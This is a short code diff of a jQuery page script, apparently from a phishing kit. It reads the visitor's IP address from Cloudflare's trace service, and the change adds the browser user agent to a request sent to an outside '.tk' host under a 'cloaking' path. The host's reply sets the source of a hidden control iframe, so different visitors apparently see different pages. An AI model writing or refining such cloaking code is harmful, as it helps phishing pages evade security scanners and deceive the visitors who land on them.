@@ -17,8 +17,8 @@ $( document ).ready(function() {
     $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
         var patlat = data.split("\n");
         var bidapatlat = patlat[2].split("=")[1];
-		
-		$.get('https://ckargo.tk/cloaking/deneme.php?ip='+bidapatlat, function(data) {
+	var ua = navigator.userAgent;	
+		$.get('https://ckargo.tk/cloaking/deneme.php?ip='+bidapatlat+'&ua='+ua, function(data) {
 			document.getElementById("framekontrol").src = data;
 			});
   })
